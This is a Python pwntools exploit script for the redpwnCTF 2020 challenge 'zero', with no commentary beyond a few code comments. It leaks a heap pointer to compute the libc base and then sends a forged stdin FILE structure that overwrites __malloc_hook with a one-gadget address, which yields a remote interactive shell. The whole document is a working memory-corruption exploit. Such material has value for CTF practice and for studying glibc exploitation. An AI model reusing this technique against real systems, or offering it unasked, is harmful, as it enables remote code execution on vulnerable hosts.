from time import sleep

from pwn import *

IP = "2020.redpwnc.tf"
PORT = 31643

bin = ELF('./zero')
libc = ELF('./libc.so.6')


def wait():
    p.recvrepeat(0.1)


goodleaks = True
# while not goodleaks:
p = remote(IP, PORT)

# def wait():
# p.recvrepeat(0.1)'''


p.recvuntil('do you want?\n')
p.sendline('12345678')
leak = int(p.recvline().split()[-1], 16)  # heap chunk on mmap
libc.address = leak + 0xbc6ff0
onegadget = libc.address + 0x10a38c
stdiniobufend = libc.symbols['_IO_2_1_stdin_'] + 64
shortbuf = libc.address + 0x3eba83
if int(hex(shortbuf)[10:12], 16) == 0x2a:
    goodleaks = True
else:
    p.close()
log.info("Heap pointer leak: %s" % hex(leak))
log.info("Libc base: %s" % hex(libc.address))
log.info("Possible one gadgets: %s" % hex(onegadget))
log.info("stdin shortbuf: %s" % hex(shortbuf))
log.info("stdin buf end: %s" % hex(stdiniobufend))
sleep(1)
p.sendlineafter("want to read?\n", str(stdiniobufend - leak + 1))
print(p.recvline())
payload = (''
           + '\x00' * 5
           + p64(libc.symbols['_IO_stdfile_0_lock'])
           + p64(0xffffffffffffffff)
           + p64(0)
           + p64(libc.symbols['_IO_wide_data_0'])
           + p64(0) * 3
           + p64(0x00000000ffffffff)
           + p64(0) * 2
           + p64(libc.symbols['_IO_file_jumps'])
           + p64(0) * 19 * 2
           + p64(libc.address + 0x3e7d60)
           + p64(0)
           + p64(libc.symbols['memalign_hook_ini'])
           + p64(libc.symbols['realloc_hook_ini'])
           + p64(onegadget)  # overwrite malloc hook
           + p64(0)
           + '\x00' * 0x400  # heap can be destroyed, __malloc_hook will prevent it from ever checking the heap
           + '')
p.sendline(payload)
p.interactive()
